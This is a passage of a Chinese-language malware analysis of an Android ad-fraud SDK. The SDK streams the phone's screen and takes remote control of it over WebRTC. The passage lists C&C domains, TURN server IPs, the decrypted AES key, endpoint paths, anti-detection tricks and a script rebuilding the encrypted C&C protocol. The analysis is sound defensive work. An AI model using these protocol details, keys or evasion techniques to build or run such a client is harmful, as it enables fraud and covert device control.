| `Content.DoneMessage` | 会话结束信号 |

### 8.3 远程控制命令协议

**文件**: `c13/nim5/ez8/h5_proto/signaling/ControlCommand.java`

#### Click 命令 (点击)

```java
public static class Click extends ControlCommand {
    private final ClickEvent click;
    // ClickEvent 包含: normalizedX (0.0-1.0), normalizedY (0.0-1.0)
}
```

坐标转换 (`IllIIlIIII1.java:1240-1251`)：
```java
float pixelX = (float) (normalizedX * webView.getWidth());
float pixelY = (float) (normalizedY * webView.getHeight());
```

#### Scroll 命令 (滚动)

```java
public static class Scroll extends ControlCommand {
    private final ScrollEvent scroll;
    // ScrollEvent 包含: deltaX, deltaY (滚动增量)
}
```

#### Input 命令 (文本输入)

```java
public static class Input extends ControlCommand {
    private final TextInput input;
    // TextInput 包含: text (要输入的文本)
}
```

命令通过 `command_type` 字段 hash 分发: "click" (94750088), "scroll" (-907680051), "input" (100358090)。

### 8.4 WebRTC 连接建立流程

**核心文件**: `llIIIIlIlllIII1/IllIIlIIII1.java`

```
Step 1: PeerConnectionFactory 初始化 (行 1123-1170)
   ├── VideoEncoderFactory (默认)
   └── VideoDecoderFactory (自定义, 分辨率限制 1280x720)

Step 2: 信令连接触发 → lllIlIIIlI1() (行 1176-1192)

Step 3: 收到远端 SDP Offer (行 1254-1265)
   ├── setRemoteDescription(offer)
   └── createAnswer(constraints)
       ├── OfferToReceiveAudio = false
       └── OfferToReceiveVideo = true

Step 4: Answer 创建成功 (行 385-398)
   └── setLocalDescription(answer)

Step 5: 本地描述设置成功 (行 361-372)
   └── 通过信令发送 Answer 至服务端

Step 6: ICE 候选收集 (行 513-529)
   └── 逐个发送 ICE Candidate (sdp, sdpMid, sdpMLineIndex)

Step 7: 远端 ICE 候选到达 (行 297-326)
   ├── 远端描述已设置 → 直接 addIceCandidate
   └── 远端描述未设置 → 缓存，待设置后批量添加
```

### 8.5 状态机

**文件**: `c13/nim5/ez8/h5_proto/signaling/UpdateSignalingStatusRequest.java:31-76`

```
UNKNOWN (0) → START (1) → IN_LANDING (2) → DONE (3)
```

| 状态 | 值 | 含义 |
|------|---|------|
| `UNKNOWN` | 0 | 初始/未知状态 |
| `START` | 1 | 已启动 |
| `IN_LANDING` | 2 | 正在加载着陆页 (上报当前 URL) |
| `DONE` | 3 | 任务完成 |

`UpdateSignalingStatusRequest` 包含: atom, jobId, status, url

#### 连接状态 (`ConnectionStatus.java`)

```
CONNECTED (0) → RECONNECTING (1) → DISCONNECTED (2)
```

### 8.6 心跳/保活机制

#### 信令层心跳 (Ping/Pong)

客户端发送 `SignalingRequest.Content.PingMessage`，服务端回复 `SignalingResponse.Content.PongMessage`。两者均包含 `message` 字段。

#### DataChannel 层心跳 (`IllIIlIIII1.java:1098-1121`)

```java
JSONObject pong = new JSONObject();
pong.put("type", "pong");
pong.put("message", "pong_from_device");
dataChannel.send(new DataChannel.Buffer(ByteBuffer.wrap(pong.toString().getBytes()), false));
```

在 DataChannel 状态变为 OPEN 时首次调用。

#### WebSocket 连接丢失检测 (`llIIllIl1/llllIIIIll1.java:86-93`)

- 默认超时: **60 秒**
- 检测间隔: 超时时间的 **1.5 倍** (90 秒)
- 超时未收到 Pong → 关闭连接 (code=1006)

### 8.7 插件启动检查

**请求**: `CheckSignalingPluginStartRequest` (包含 Atom)

**响应**: `CheckSignalingPluginStartResponse`
```json
{
    "code": 0,        // 0=成功
    "message": "",
    "run": true,      // 是否启动
    "offerId": "",    // Offer标识
    "jobId": ""       // 任务ID
}
```

流程 (`IlIlllIIlI1/llllIllIl1.java:306-321`)：
```
发送 CheckSignalingPluginStart → CountDownLatch.await()
   → code==0 且 run==true → 保存 offerId/jobId → 启动信令
   → 否则 → 断开连接
```

### 8.8 视频采集系统

#### VirtualDisplay 模式 (主)

**文件**: `llIIIIlIlllIII1/llllIllIl1.java`

- 使用 `DisplayManager` 创建 VirtualDisplay
- WebView 渲染到虚拟显示器
- `ImageReader` 捕获帧数据
- `SurfaceTextureHelper` 送入 WebRTC 视频管道
- 帧率: **15 fps**

#### Bitmap 模式 (备用)

**文件**: `llIIIIlIlllIII1/llllIIIIll1.java`

通过 `Surface.lockHardwareCanvas()` 将 Bitmap 直接绘制到 WebRTC Surface。

#### 视频配置

- 最大帧间隔: 50ms (20fps 上限)
- 视频解码器限制分辨率: **1280×720**
- 最大重试次数: 2

### 8.9 错误处理与重连

| 场景 | 处理逻辑 |
|------|---------|
| ICE FAILED | `restartIce()` → 延迟检查 → 若仍 FAILED 则完全重建 |
| ICE DISCONNECTED | 延迟检查 → 若仍 DISCONNECTED 则 `restartIce()` |
| ICE 候选错误 (701/702) | 触发 `restartIce()` |
| DataChannel CLOSED/CLOSING | 检查 ICE 状态 → 非 CONNECTED 则延迟 1000ms 完全重建 |
| SDP 协商失败 | 统一调用 `llIIllIl1()` 触发错误处理 |
| 信令层异常 | 记录日志 → 触发完全重建 |

### 8.10 WebRTC 完整连接流程

#### 端到端连接架构

```
┌─────────────┐     ①HTTP POST      ┌──────────────────────┐
│  被感染手机   │ ─────────────────→  │  C&C API 服务器       │
│  (nova2 SDK) │ ←─────────────────  │  playstations.click   │
│              │   返回 token+offer  │  (Spring Boot)        │
└──────┬───────┘                    └──────────────────────┘
       │
       │ ②WebSocket 连接 (ws://信令服务器)
       ▼
┌──────────────────────┐
│  信令服务器 (Signaling) │  ← C&C 动态下发 URL
│  WebSocket/gRPC       │
└──────┬───────────────┘
       │
       │ ③SDP/ICE 交换 (通过 WebSocket 中转)
       │
       ▼
┌──────────────────────┐         ┌──────────────────┐
│  TURN 中继服务器       │ ←─────→ │  攻击者控制端      │
│  101.36.120.3:3478   │  WebRTC  │  (Web 远程操控)    │
│  106.75.153.105:3478 │  P2P/中继 │                  │
│  (UCloud 香港/上海)   │         │                  │
└──────────────────────┘         └──────────────────┘
       ↕ WebRTC
┌──────────────────────┐
│  被感染手机            │
│  ├─ VideoTrack (上行)  │  ← 15fps WebView 屏幕捕获
│  └─ DataChannel (双向) │  ← 远程控制指令
└──────────────────────┘
```

#### 时序图

```
手机端                    C&C API服务器              信令服务器              TURN服务器             攻击者控制端
  │                         │                        │                      │                      │
  │── POST /phantom/token →│                        │                      │                      │
  │←─ token ──────────────│                        │                      │                      │
  │                         │                        │                      │                      │
  │── POST /phantom/task ─→│                        │                      │                      │
  │←─ taskConfig ─────────│                        │                      │                      │
  │                         │                        │                      │                      │
  │── CheckPluginStart ───→│                        │                      │                      │
  │←─ {run:true, offerId} │                        │                      │                      │
  │                         │                        │                      │                      │
  │── POST /h5/get_job ──→│                        │                      │                      │
  │←─ {offer, ws_url, ────│                        │                      │                      │
  │    turn_url, creds}    │                        │                      │                      │
  │                         │                        │                      │                      │
  │── POST /h5/js_file ──→│                        │                      │                      │
  │←─ signaling JS ────── │                        │                      │                      │
  │                         │                        │                      │                      │
  │                         │  WebSocket connect     │                      │                      │
  │──────────────────────────────────────────────→│                      │                      │
  │                         │     ←── connected ──→ │                      │                      │
  │── join(room) ──────────────────────────────→│                      │                      │
  │                         │                        │                      │                      │
  │  创建 PeerConnection    │                        │                      │                      │
  │  配置 TURN 服务器       │                        │                      │                      │
  │  启动视频捕获 (15fps)    │                        │                      │                      │
  │                         │                        │                      │                      │
  │                         │                        │←─ SDP Offer ────────────────────────────── │
  │←─── SDP Offer (via WS) ─────────────────────│                      │                      │
  │                         │                        │                      │                      │
  │  setRemoteDescription   │                        │                      │                      │
  │  createAnswer           │                        │                      │                      │
  │  setLocalDescription    │                        │                      │                      │
  │                         │                        │                      │                      │
  │── SDP Answer (via WS) ──────────────────────→│                      │                      │
  │                         │                        │── SDP Answer ────────────────────────────→│
  │                         │                        │                      │                      │
  │── ICE Candidate ────────────────────────────→│                      │                      │
  │                         │                        │── ICE Candidate ──────────────────────→ │
  │←── ICE Candidate ───────────────────────────│                      │                      │
  │                         │                        │                      │                      │
  │  addIceCandidate        │                        │                      │                      │
  │                         │                        │                      │                      │
  │══════════════ WebRTC P2P/TURN 连接建立 ═══════════════════════════│                      │
  │                         │                        │                      │                      │
  │←──────── DataChannel: {"type":"ready"} ──────────────────────── TURN ──────────────────── │
  │──────── {"type":"pong","message":"pong_from_device"} ──────── TURN ──────────────────→│
  │                         │                        │                      │                      │
  │←──── {"action":"click","x":0.5,"y":0.3} ──── TURN ──────────────────────────────────── │
  │  执行 dispatchTouchEvent │                        │                      │                      │
  │                         │                        │                      │                      │
  │═══════ VideoTrack: WebView 实时屏幕画面 (15fps) ═════════════ TURN ──────────────────→│
  │                         │                        │                      │                      │
```

#### 各阶段详细说明

| 阶段 | 组件 | 代码位置 | 说明 |
|------|------|---------|------|
| **① 认证+获取任务** | ApiClient | `api/ApiClient.java` | 手机向 `playstations.click` 发送 POST 请求获取 token 和任务配置 |
| **② 信令连接** | SignalingConnection | `signaling/SignalingConnection.java` | 手机用 WebSocket 连接信令服务器，发送 join 加入房间，维持 ping/pong 心跳 |
| **③ PeerConnection 创建** | WebRTCController | `webrtc/WebRTCController.java` | 手机创建 PeerConnection，硬编码 TURN 服务器配置 |
| **④ SDP/ICE 交换** | WebRTCController + SignalingConnection | 两个文件协作 | 通过信令服务器中转 SDP Offer/Answer 和 ICE Candidate |
| **⑤ 媒体通道建立** | WebRTCController | `webrtc/WebRTCController.java` | WebRTC P2P 连接建立（通过 TURN 中继），开启 VideoTrack + DataChannel |
| **⑥ 远程控制** | WebRTCController | `webrtc/WebRTCController.java` | 攻击者通过 DataChannel 发送控制指令，手机执行触摸/键盘/JS 注入 |

#### 关键安全特征

| 特征 | 说明 |
|------|------|
| **手机主动外连** | 所有连接由手机发起，无需开放端口，NAT/防火墙无法阻止 |
| **TURN 必须** | 手机在 NAT 后面，TURN 作为中继转发所有 WebRTC 流量 |
| **攻击者实时看屏** | WebView 内容 15fps 录屏推流，攻击者实时观察受害者页面 |
| **远程操作** | DataChannel 传输触摸/键盘指令，等同远程桌面控制 |
| **多层冗余** | 两台 TURN 服务器 + ICE 重连机制，确保连接稳定 |

### 8.11 资源清理

**方法**: `IIIlIllIlI1()` (行 876-957)

使用 `AtomicBoolean.compareAndSet(false, true)` 确保只执行一次：

```
1. 取消截屏定时器
2. 停止连接丢失检测
3. 重置就绪标志
4. 关闭 DataChannel
5. 关闭 PeerConnection
6. 释放 VideoTrack / VideoSource
7. 释放 PeerConnectionFactory
8. 通知信令客户端清理
9. 关闭线程池
10. 取消心跳定时器
```

每一步包裹在独立 try/catch 中，确保某步失败不影响后续清理。

## 九、反检测手段

| 手段 | 实现 |
|---|---|
| **字符串全加密** | 所有字符串使用 XOR 密码加密（8字节密钥），运行时解密 |
| **AES-256-CFB** | 网络通信使用 AES-CFB/NoPadding 加密 + GZIP 压缩 |
| **包名伪装** | 使用 `com.android.wallpaper` 伪装成系统壁纸应用 |
| **类名混淆** | 使用 `IlIIlllllI1`/`llllIIIIll1` 等 l/I 混淆命名 |
| **PackageManager Hook** | 配置中包含 `hookPackageManagerStackTraces`，主动 hook 包管理器 |
| **手势随机化** | 坐标偏移、贝塞尔曲线、压力/时间随机化 |
| **反取证清理** | 每次任务后清除 cookies、缓存、历史、表单数据、SSL 偏好 |
| **进程检查** | 检查当前进程名是否匹配包名 |
| **时间窗口检查** | 21600000ms (6小时) 冷却时间，防止频繁执行 |
| **定时器** | 每30分钟 (1800000ms) 循环执行任务 |

## 十、关键文件路径

### 10.1 JADX 反编译输出 (原始混淆)

| 组件 | 反编译路径 |
|---|---|
| 入口点 | `com/nied/MainActivity.java` → `com/nied/lduvv/Kucopd.java` |
| 触摸伪造 | `com/nied/MotionHelper.java` |
| 随机数工具 | `com/nied/RandomHelper.java` |
| 字符串加密 | `IlIlllIIlI1/IllIIlIIII1.java` |
| SDK配置常量 | `IlIlllIIlI1/llllIIIIll1.java` |
| 主控制逻辑 | `IlIlllIIlI1/llllIllIl1.java` |
| HTTP通信 | `c13/nim5/ez8/h5_proto/HttpGatewayClient.java` |
| SDK核心 | `c13/nim5/ez8/h5_proto/DllpgdLiteSDK.java` |
| 设备指纹 | `c13/nim5/ez8/h5_proto/Atom.java` |
| 远程配置 | `c13/nim5/ez8/h5_proto/DllpgdConfig.java` |
| WebRTC信令 | `c13/nim5/ez8/h5_proto/signaling/` |
| WebView控制 | `lIllIlIll1/` (混淆包) |
| WebRTC控制器 | `llIIIIlIlllIII1/` (混淆包) |
| 点击测试页 | `assets/click_test.html` |
| ART 性能配置 | `assets/dexopt/baseline.prof`, `assets/dexopt/baseline.profm` |

### 10.2 还原后代码 (可读)

| 模块 | 还原路径 | 文件数 | 代码行数 |
|------|----------|--------|----------|
| 信令协议 | `restored_java/signaling/` | 21 | 2,834 |
| WebRTC 远程控制 | `restored_java/webrtc/` | 4 | 2,897 |
| 触摸伪造 + WebView 自动化 | `restored_java/touch/` | 9 | 3,817 |
| C&C 通信协议 | `restored_java/c2/` | 17 | 1,927 |
| 核心工具类 | `restored_java/core/` | 7 | 1,275 |
| API 客户端 | `restored_java/api/` | 3 | 772 |
| 数据模型 | `restored_java/model/` | 7 | 569 |
| **合计** | `restored_java/` | **68** | **14,091** |

### 10.3 分析辅助工具

| 工具 | 路径 | 用途 |
|------|------|------|
| XOR 批量解密器 | `decrypt_all_strings.py` | 信令/WebRTC 文件加密字符串解密 |
| 触摸模块解密器 | `decrypt_touch_strings.py` | 触摸模块加密字符串解密 |
| C&C 通信客户端 | `c2_client.py` | AES-256-CFB 加密协议实测工具 |

## 十一、C&C 通信协议实测验证

### 11.1 XOR 解密全量常量

通过实现 XOR 解密引擎，对 `HttpGatewayClient.java` 和 `DllpgdLiteSDK.java` 中所有加密常量进行批量解密，得到以下真实值：

#### 服务器与协议常量

| 分类 | 加密形式 | 解密结果 |
|------|----------|----------|
| **C&C 域名** | `{-23,123,-35,-81,94,-27,-90,-90,-31,126,-46,-76}` | `dllpgd.click` |
| **AES 密钥种子** | `{38,-117,-123,-14,-53,113,-43,-72}` | `GreenDay` |
| **加密算法** | `{-116,-56,63,...}` (18字节) | `AES/CFB/NoPadding` |
| **Content-Type** | `{30,-18,28,...}` (16字节) | `application/json` |
| **User-Agent** | `{-78,113,98,...}` (20字节) | `DllpgdLiteClient/2.0` |
| **请求编码** | `{60,-84,-126,...}` (5字节) | `UTF-8` |

#### API 端点路径

| 端点 | 解密路径 | 功能 |
|------|----------|------|
| getConfig | `/api/v1/dllpgd/getConfig` | 获取远程配置 |
| updateEvent | `/api/v1/dllpgd/updateEvent` | 上报事件 |
| updateLog | `/api/v1/dllpgd/updateLog` | 上报日志 |

#### Atom (设备指纹) JSON 字段名

| 加密形式 | 解密字段名 | 用途 |
|----------|-----------|------|
| `{-57,88,-127,87,...}` | `deviceId` | 设备唯一标识 |
| `{89,24,-27,-39,...}` | `version` | 协议版本号 (硬编码=208) |
| `{81,50,43,-59,...}` | `appPackageName` | 应用包名 |
| `{-16,54,-35,-42,...}` | `gaId` | Google Advertising ID |
| `{93,66,11,-56}` | `data` | 数据负载 |
| `{58,-76,-5,-15,...}` | `sessionId` | 会话标识 |
| `{28,1,55,117,...}` | `appChannel` | 渠道标识 |
| `{77,-66,124,-101,...}` | `isGeneratedBySubProcess` | 子进程标志 |
| `{104,20,-45,104,...}` | `deviceInfo` | 设备信息对象 |
| `{92,-27,23,-25,...}` | `pluginInfos` | 插件信息列表 |

#### DeviceInfo 子对象字段名

| 解密字段名 | 用途 |
|-----------|------|
| `locale` | 系统语言/地区 |
| `timezone` | 时区 |
| `phoneModel` | 手机型号 |
| `androidVersion` | Android 版本 |
| `phoneTimestamp` | 设备时间戳 |

### 11.2 AES 密钥派生实测

```
种子字符串:   "GreenDay"
         ↓ MD5 Hash
MD5 摘要:     66987ce7134f63ef7ee6f5024ad312b3
         ↓ toUpperCase()
AES-256 密钥: 66987CE7134F63EF7EE6F5024AD312B3 (32字节 ASCII = 256位)
```

> **重要更正**: 此前分析中将加密模式误记为 `AES/CBC/PKCS5Padding`。经 XOR 解密 `Cipher.getInstance()` 参数字符串，实际加密模式为 **`AES/CFB/NoPadding`**（密文反馈模式，无填充）。Java 默认 CFB segment size 为 128 位（等效于 CFB128）。

### 11.3 C&C 服务器基础设施探测

对 `dllpgd.click` 域名进行 DNS 解析和端口探测：

| 项目 | 结果 |
|------|------|
| **DNS 解析** | `18.204.68.18`, `18.206.233.238` (AWS EC2, us-east-1) |
| **HTTPS (443)** | 连接拒绝 (Connection Refused) |
| **HTTP (80)** | 连接成功，Spring Boot Whitelabel Error Page |
| **服务器框架** | Spring Boot (Java) |
| **状态** | 服务器存活，但 API 端点已下线 |

### 11.4 API 端点探测结果

使用完整加密管道构造请求并发送至 C&C 服务器：

```
请求配置:
  URL:           http://dllpgd.click/api/v1/dllpgd/{endpoint}
  Method:        POST
  Content-Type:  application/json
  User-Agent:    DllpgdLiteClient/2.0
  Body:          5层加密后的 Atom JSON
  加密模式:       AES-256-CFB/NoPadding
  AES Key:       66987CE7134F63EF7EE6F5024AD312B3
```

| 端点 | HTTP 状态码 | 响应 |
|------|-------------|------|
| `/api/v1/dllpgd/getConfig` | **404** | Spring Boot Whitelabel Error |
| `/api/v1/dllpgd/updateEvent` | **404** | Spring Boot Whitelabel Error |
| `/api/v1/dllpgd/updateLog` | **404** | Spring Boot Whitelabel Error |
| `/` (根路径) | **404** | Whitelabel Error Page |
| `/api/` | **404** | Whitelabel Error Page |
| `/api/v1/` | **404** | Whitelabel Error Page |
| `/actuator` | **404** | Whitelabel Error Page |

**结论**: C&C 服务器 Spring Boot 实例仍在运行，但所有 API 路由已被移除或未部署。该恶意软件的后端基础设施已被停用（decommissioned），无法获取实际配置数据或上报功能。

### 11.5 协议重建工具

已编写完整的 C&C 协议重建脚本 `c2_client.py`，实现：

- XOR 解密引擎（批量解密所有加密常量）
- AES-256-CFB 加密/解密（与 APK 完全一致的实现）
- GZIP 压缩/解压
- 5 层加密管道（JSON → GZIP → Base64 → AES → Base64）
- Atom 设备指纹构造
- 三个 API 端点的请求发送

## 十二、Assets 资源文件分析

### 12.1 click_test.html — 点击监控测试页

**文件**: `assets/click_test.html` (1,377 字节)

功能：一个用于测试和校准程序化点击的 HTML 测试页面。

```html
<!-- 核心逻辑 -->
<script>
document.addEventListener('click', function(event) {
    var x = event.clientX;
    var y = event.clientY;
    // 调用 Android 原生接口
    AndroidInterface.onClick(x, y);
});
</script>
```

- 页面显示文本 "Click on this page" 并渲染可点击区域
- 监听所有 `click` 事件，记录精确坐标 (clientX, clientY)
- 通过 `AndroidInterface.onClick()` 将坐标回传给 Android 端
- 用于验证 `MotionHelper` 生成的模拟触摸事件是否被 WebView 正确识别

### 12.2 Baseline Profile — 恶意代码性能优化

#### 文件概述

| 文件 | 大小 | 格式 | 说明 |
|------|------|------|------|
| `assets/dexopt/baseline.prof` | 2,971 字节 | ART Profile V010 P | Android 9+ AOT 编译配置 |
| `assets/dexopt/baseline.profm` | 283 字节 | ART Profile Metadata V002 | Android 12+ 元数据补充 |

#### 加载机制

通过 `androidx.profileinstaller.ProfileInstaller` 在应用安装或首次启动时加载：

```
assets/dexopt/baseline.prof
        ↓ ProfileInstaller.transcodeAndWrite()
/data/misc/profiles/cur/0/<package>/primary.prof
        ↓ ART 编译器读取
AOT 编译指定 Hot 方法 → 原生机器码
```

- 源码位置: `androidx/profileinstaller/ProfileInstaller.java`
- 配置路径常量: `PROFILE_SOURCE_LOCATION = "dexopt/baseline.prof"` (行 108)
- 元数据路径常量: `PROFILE_META_LOCATION = "dexopt/baseline.profm"` (行 107)
- 写入路径: `/data/misc/profiles/cur/0/<pkg>/primary.prof`

#### Profile 二进制格式解析

```
baseline.prof 结构:
┌──────────────────────────┐
│ Magic: "pro\x00"         │  4 字节
│ Version: "010\x00"       │  4 字节  (ART Profile V010)
│ DEX 文件数: 1             │  1 字节
│ Uncompressed Size: 21616 │  4 字节
│ Compressed Size: 2950    │  4 字节
│ zlib 压缩数据             │  2950 字节
└──────────────────────────┘

解压后数据 (21,616 字节):
┌──────────────────────────┐
│ DEX Key: "classes.dex"   │  关联的 DEX 文件标识
│ Checksum: 0x23B6B1C2     │  DEX 校验和
│ Method Bitmap             │  Hot/Startup/PostStartup 标记
│ Class Bitmap              │  类加载状态标记
└──────────────────────────┘
```

#### 性能优化的恶意方法统计

从 profile 中提取的 1,218 个 HOT 标记方法中，以下为恶意功能相关的关键优化类：

| 类/包 | HOT 方法数 | 功能 | 优化意义 |
|--------|-----------|------|----------|
| `lIllIlIll1.*` (WebView控制包) | ~100+ | WebView 配置、JS 注入、页面加载 | 加速广告页面加载和交互 |
| `c13.nim5.ez8.h5_proto.signaling.*` | ~50+ | WebRTC 信令消息构造和解析 | 降低远程控制延迟 |
| `c13.nim5.ez8.h5_proto.HttpGatewayClient` | ~20 | HTTP 通信、AES 加密解密 | 加速 C&C 通信加密管道 |
| `c13.nim5.ez8.h5_proto.DllpgdLiteSDK` | ~10 | SDK 核心方法 | 加速初始化流程 |
| `com.nied.MotionHelper` | ~5 | 触摸事件伪造 | 确保触摸注入的低延迟 |
| `IlIlllIIlI1.*` (混淆工具包) | ~30 | XOR 解密、设备ID生成 | 加速字符串解密操作 |
| `IlIlIIIlIlIlll1.*` | ~15 | MD5、AES、环境检测 | 加速加密和反分析检查 |

**高频调用方法 TOP 5**:

| 方法 (DEX method_id) | 调用/引用次数 | 推测功能 |
|---------------------|-------------|----------|
| 信令消息构造器 | 366 次 | WebRTC 信令 JSON 序列化 |
| WebView 控制方法 | 127 次 | 页面加载/JS 执行控制 |
| 字符串解密 (XOR) | 95 次 | 运行时常量解密 |
| HTTP 请求发送 | 48 次 | C&C 通信 |
| 触摸事件分发 | 33 次 | MotionEvent 注入 |

#### 安全分析意义

Baseline Profile 的存在表明该恶意软件的开发者有意识地对恶意代码执行路径进行了 **AOT 编译优化**：

1. **降低启动延迟**: 恶意功能的核心方法在安装时即编译为原生代码，避免 JIT 编译开销
2. **提升帧捕获性能**: VirtualDisplay 的 `onImageAvailable` 回调被标记为 HOT，确保屏幕捕获的低延迟
3. **优化远程控制响应**: WebRTC 信令相关方法的 AOT 编译降低了远程指令的响应时间
4. **加速加密操作**: AES/XOR 等加密方法的编译优化减少了通信延迟
5. **平滑触摸注入**: MotionHelper 的优化确保模拟触摸事件的时序精度，使其更难被反欺诈系统检测

这种做法在合法应用中用于改善用户体验，但在此恶意 SDK 中被用于确保欺诈操作的高效执行。

## 十三、混淆代码还原

### 13.1 还原概述

对 JADX 反编译输出的关键恶意类进行了系统性还原，将混淆后不可读的代码转换为结构清晰、命名规范的 Java 源文件。还原工作涵盖七大功能模块，共计 **68 个文件、~14,000+ 行**代码。

#### 还原手段

| 技术 | 说明 |
|------|------|
| **XOR 批量解密** | 编写 Python 解密引擎 (`decrypt_all_strings.py`)，批量提取并解密所有 `llllIIIIll1(new byte[]{...}, new byte[]{...})` 调用中的加密字符串 |
| **类名还原** | 将 `lIIIIlllllIlll1`、`llllIIIIll1` 等混淆名替换为 `SwipeSimulator`、`WebViewAutomationBase` 等描述性名称 |
| **字段名还原** | 将 `f508llllIIIIll1`、`f482IlIlllIIlI1` 等 JADX 自动重命名字段替换为 `webView`、`controlPoint` 等语义化名称 |
| **内部类还原** | 将 9 个匿名/混淆内部类还原为 `CleanupRunnable`、`UploadTimerTask`、`CustomWebViewClient` 等 |
| **失败方法重建** | 对 JADX 反编译失败的方法 (`getRandomScrollMotionEvents`, 686 条指令) 基于上下文逻辑重建 |
| **AndroidX 常量替换** | 将 `InputDeviceCompat.SOURCE_TOUCHSCREEN` 等引用替换为原始字面量 `0x1002` |
| **JADX 产物清理** | 移除 `/* loaded from: classes.dex */`、`/* JADX INFO: ... */` 等反编译器注释 |
| **Javadoc 注释** | 为所有类和关键方法添加 Javadoc，标注恶意行为意图 |

#### 还原统计

| 模块 | 文件数 | 代码行数 | 输出目录 |
|------|--------|----------|----------|
| 信令协议 (Signaling) | 21 | 2,834 | `restored_java/signaling/` |
| WebRTC 远程控制 | 4 | 2,897 | `restored_java/webrtc/` |
| 触摸伪造 + WebView 自动化 | 9 | 3,817 | `restored_java/touch/` |
| C&C 通信协议 | 17 | 1,927 | `restored_java/c2/` |
| 核心/API/模型依赖 | 17 | 2,616 | `restored_java/core/`, `api/`, `model/` |
| **合计** | **68** | **~14,091** | `restored_java/` |

---

### 13.2 信令协议还原 (19 文件)

**原始路径**: `jadx_output/sources/c13/nim5/ez8/h5_proto/signaling/`
**还原路径**: `restored_java/signaling/`

这些类定义了 WebRTC 信令通信的完整消息体系。原始代码中所有 JSON 字段名、内容类型常量均通过 XOR 加密存储，运行时解密。

#### 文件清单与类名映射

| 还原文件名 | 原始混淆类名 | 行数 | 功能说明 |
|-----------|-------------|------|---------|
| `JsonSerializable.java` | `IlIllll1` | 18 | JSON 序列化接口，定义 `toJSONObject()` 方法 |
| `SignalingRequest.java` | `IlIlIIlIII1` | 179 | 客户端→服务端信令请求封装，含 5 种内容类型鉴别器 |
| `SignalingResponse.java` | `llllIllIl1` | 187 | 服务端→客户端信令响应封装，含 6 种内容类型鉴别器 |
| `ControlCommand.java` | `IIlIllIIll1` | 156 | 远控命令封装 (click/scroll/input 三种子类型) |
| `SDPOffer.java` | `llIIIIlIlllIII1` | 63 | SDP Offer 消息 (type + sdp 字段) |
| `SDPAnswer.java` | `lIIIIlllllIlll1` | 63 | SDP Answer 消息 (type + sdp 字段) |
| `ICECandidate.java` | `llIIllIl1` | 78 | ICE 候选消息 (sdpMid + sdpMLineIndex + sdp) |
| `ClickEvent.java` | `lIllIIIlIl1` | 63 | 点击事件 (normalizedX/Y, 0.0-1.0 归一化坐标) |
| `ScrollEvent.java` | `lIllIlIll1` | 63 | 滚动事件 (deltaX/deltaY 滚动增量) |
| `TextInput.java` | `llllllIlIIIlll1` | 49 | 文本输入事件 (text 字段) |
| `ConnectionStatus.java` | `IlIlllIIlI1` | 48 | 连接状态 (status 字符串) |
| `Ping.java` | `IlIllIlllIllI1` | 49 | 心跳请求 (timestamp 时间戳) |
| `Pong.java` | `IllIIlIIII1` | 49 | 心跳响应 (timestamp 时间戳) |
| `Done.java` | `IIIlIllIlI1` | 33 | 会话结束信号 |
| `Error.java` | `lllllIllIl1` | 63 | 错误消息 (code + message) |
| `UpdateSignalingStatusRequest.java` | `C0017llllIIIIll1` | 135 | 信令状态上报请求 (含 6 种状态枚举) |
| `UpdateSignalingStatusResponse.java` | `C0018llllIllIl1` | 63 | 信令状态上报响应 |
| `CheckSignalingPluginStartRequest.java` | `IlIlIIIlIlIlll1` | 49 | 信令插件启动检查请求 |
| `CheckSignalingPluginStartResponse.java` | `IIlIllIIll1` | 106 | 信令插件启动检查响应 (含 WebSocket URL、STUN/TURN 配置) |

#### 关键解密常量示例

| 上下文 | 加密形式 | 解密结果 |
|--------|----------|----------|
| SignalingRequest 内容类型 | XOR 加密 | `sdp_offer`, `sdp_answer`, `ice_candidate`, `control`, `ping` |
| SignalingResponse 内容类型 | XOR 加密 | `sdp_offer`, `sdp_answer`, `ice_candidate`, `status`, `pong`, `done` |
| ControlCommand 命令类型 | XOR 加密 | `click`, `scroll`, `input` |
| UpdateSignalingStatus 状态 | XOR 加密 | `IN_LANDING`, `SIGNALING_CONNECTED`, `SIGNALING_FAILED`, `PEER_CONNECTED`, `PEER_DISCONNECTED`, `PEER_FAILED` |
| ICECandidate 字段名 | XOR 加密 | `sdpMid`, `sdpMLineIndex`, `sdp` |
| CheckSignalingPluginStartResponse | XOR 加密 | `ws_url`, `stun_url`, `turn_url`, `turn_username`, `turn_credential` |

---

### 13.3 WebRTC 远程控制还原 (4 文件)

**原始路径**: `jadx_output/sources/llIIIIlIlllIII1/`
**还原路径**: `restored_java/webrtc/`

这些类实现了完整的 WebRTC 远程控制系统，包括 PeerConnection 管理、屏幕捕获、视频编码和控制命令处理。

#### 文件清单与类名映射

| 还原文件名 | 原始混淆类名 | 行数 | 功能说明 |
|-----------|-------------|------|---------|
| `WebRTCController.java` | `IllIIlIIII1` | 1,465 | WebRTC 主控制器：PeerConnection 生命周期管理、SDP/ICE 协商、DataChannel 控制命令分发、屏幕截图上行 |
| `VirtualDisplayCapturer.java` | `llllIllIl1` | 623 | VirtualDisplay 屏幕捕获器：通过 MediaProjection + ImageReader 实时捕获屏幕帧，转换为 WebRTC 视频流 |
| `BitmapFrameCapturer.java` | `llllIIIIll1` | 348 | Bitmap 截屏备用方案：当 VirtualDisplay 不可用时，通过 `View.draw(Canvas)` 截取 WebView 内容 |
| `SafeVideoDecoderFactory.java` | `lIIIIlllllIlll1` | 461 | 安全视频解码器工厂：包装 WebRTC 原生 `DefaultVideoDecoderFactory`，添加分辨率限制 (1280×720) 和异常保护 |

#### 关键还原内容

**WebRTCController.java** (1,465 行) — 核心文件，包含：
- **62 个字段**全部从混淆名还原为语义化名称 (如 `f287llllIIIIll1` → `peerConnection`, `f279IlIlIIlIII1` → `webView`)
- **8 个内部类**还原: `PeerConnectionObserver`, `SDPObserver`, `DataChannelObserver`, `CreateAnswerCallback`, `SetLocalDescCallback`, `SetRemoteDescCallback`, `SignalingHandler`, `ScreenCaptureCallback`
- **所有 XOR 加密字符串**替换为明文 (ICE server URLs、DataChannel 名称 `"dataChannel"`、日志消息等)
- 完整的 WebRTC 连接建立流程、远程控制命令处理链、屏幕捕获与编码逻辑

**VirtualDisplayCapturer.java** (623 行) — 包含：
- MediaProjection + VirtualDisplay + ImageReader 的完整屏幕捕获管道
- `onImageAvailable` 回调：Image → Bitmap → YUV420 → WebRTC VideoFrame 转换
- 帧率控制、分辨率自适应、资源清理逻辑

---

### 13.4 触摸伪造 + WebView 自动化还原 (9 文件)

**原始路径**: `jadx_output/sources/com/nied/`、`jadx_output/sources/lIllIlIll1/`、`jadx_output/sources/com/nied/lduvv/`
